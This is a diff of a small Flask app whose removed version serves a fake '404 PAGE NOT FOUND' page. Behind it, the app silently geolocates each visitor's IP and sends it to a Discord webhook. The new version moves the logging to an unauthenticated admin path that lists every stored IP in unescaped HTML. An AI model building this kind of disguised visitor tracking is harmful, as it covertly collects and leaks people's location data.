@@ -1,28 +1,27 @@
 from flask import Flask, request
 import sqlite3
-from datetime import datetime, timedelta
 import requests
 import os
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
 
-# 🔐 Discord webhook (Render ENV'den alınır)
-DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
+DB = "data.db"
+WEBHOOK = os.getenv("DISCORD_WEBHOOK")
 
-# DB
+
+# ---------------- DATABASE ----------------
 def init_db():
-    conn = sqlite3.connect("data.db")
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("""
         CREATE TABLE IF NOT EXISTS logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             ip TEXT,
-            ulke TEXT,
-            sehir TEXT,
+            country TEXT,
+            city TEXT,
             isp TEXT,
-            tarih TEXT,
-            saat TEXT,
-            timestamp DATETIME
+            time TEXT
         )
     """)
     conn.commit()
@@ -31,119 +30,101 @@ def init_db():
 init_db()
 
 
-# IP info
-def ip_bilgi(ip):
+# ---------------- GEO IP ----------------
+def geo(ip):
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)
-        d = r.json()
-        if d["status"] == "success":
-            return d["country"], d["city"], d["isp"]
+        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
+        return r.get("country","?"), r.get("city","?"), r.get("isp","?")
     except:
-        pass
-    return "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
+        return "?", "?", "?"
 
 
-# 30 dk kontrol
-def son_30dk(ip):
-    conn = sqlite3.connect("data.db")
+# ---------------- WEBHOOK ----------------
+def send(msg):
+    if WEBHOOK:
+        try:
+            requests.post(WEBHOOK, json={"content": msg}, timeout=3)
+        except:
+            pass
+
+
+# ---------------- COOLDOWN (30 DK) ----------------
+def blocked(ip):
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute("SELECT timestamp FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
+    c.execute("SELECT time FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
     row = c.fetchone()
     conn.close()
 
     if not row:
         return False
 
-    last = datetime.fromisoformat(row[0])
+    last = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
     return datetime.now() - last < timedelta(minutes=30)
 
 
-# LOG
-def ekle(ip):
-    if son_30dk(ip):
-        return
+# ---------------- INSERT LOG ----------------
+def log(ip, country, city, isp):
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    now = datetime.now()
-    ulke, sehir, isp = ip_bilgi(ip)
-
-    conn = sqlite3.connect("data.db")
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute("""
-        INSERT INTO logs (ip, ulke, sehir, isp, tarih, saat, timestamp)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
-    """, (ip, ulke, sehir, isp,
-          now.strftime("%Y-%m-%d"),
-          now.strftime("%H:%M:%S"),
-          now.isoformat()))
+    c.execute("INSERT INTO logs (ip,country,city,isp,time) VALUES (?,?,?,?,?)",
+              (ip, country, city, isp, now))
     conn.commit()
     conn.close()
 
-    # Discord log
-    if DISCORD_WEBHOOK:
-        try:
-            requests.post(DISCORD_WEBHOOK, json={
-                "content": f"📡 Ziyaret\nIP: {ip}\nÜlke: {ulke}\nŞehir: {sehir}\nISP: {isp}\nSaat: {now.strftime('%H:%M:%S')}"
-            })
-        except:
-            pass
+    send(f"📡 IP: {ip} | {country} - {city} | {isp} | {now}")
 
 
-# HOME (404)
+# ---------------- 404 PAGE ----------------
 @app.route("/")
 def home():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip = ip.split(",")[0].strip()
-
-    ekle(ip)
-
     return """
-    <body style="background:black;color:white;text-align:center;font-family:monospace;padding-top:100px;">
-        <h1>404</h1>
-        <p>PAGE NOT FOUND</p>
-        <small style="color:gray;">
-            The requested URL was not found on this server.<br>
-            Please check the URL or try again later.
-        </small>
+    <body style="background:black;color:white;text-align:center;font-family:monospace;padding-top:120px;">
+        <h1 style="font-size:70px;">404</h1>
+        <h3>PAGE NOT FOUND</h3>
+        <p style="color:gray;">The page you are looking for does not exist.</p>
+        <p style="color:gray;">Check the URL and try again.</p>
     </body>
     """, 404
 
 
-# ADMIN PANEL
+# ---------------- ADMIN PANEL ----------------
 @app.route("/rexa/1103")
 def admin():
-    conn = sqlite3.connect("data.db")
+
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = ip.split(",")[0].strip()
+
+    if blocked(ip):
+        return "<h1 style='color:red'>WAIT 30 MINUTES</h1>"
+
+    country, city, isp = geo(ip)
+    log(ip, country, city, isp)
+
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute("SELECT ip, ulke, sehir, isp, tarih, saat FROM logs ORDER BY id DESC")
-    data = c.fetchall()
+    c.execute("SELECT ip,country,city,isp,time FROM logs ORDER BY id DESC")
+    rows = c.fetchall()
     conn.close()
 
-    html = """
+    html = ""
+    for r in rows:
+        html += f"<div>{r[0]} | {r[1]} | {r[2]} | {r[3]} | {r[4]}</div><hr>"
+
+    return f"""
     <html>
-    <head>
+    <body style="background:#0d0d0d;color:#00ff00;font-family:monospace;padding:20px;">
+        <h2>ADMIN PANEL</h2>
         <meta http-equiv="refresh" content="5">
-        <style>
-            body { background:#0a0a0a; color:#00ff00; font-family:monospace; padding:20px; }
-            .box { border-bottom:1px solid #222; padding:10px; }
-            .ip { color:#00ffcc; }
-        </style>
-    </head>
-    <body>
-    <h2>ADMIN PANEL</h2>
+        {html}
+    </body>
+    </html>
     """
 
-    for i in data:
-        html += f"""
-        <div class="box">
-            <div class="ip">IP: {i[0]}</div>
-            <div>Ülke: {i[1]} | Şehir: {i[2]}</div>
-            <div>ISP: {i[3]}</div>
-            <div>{i[4]} {i[5]}</div>
-        </div>
-        """
 
-    html += "</body></html>"
-    return html
-
-
+# ---------------- RUN ----------------
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
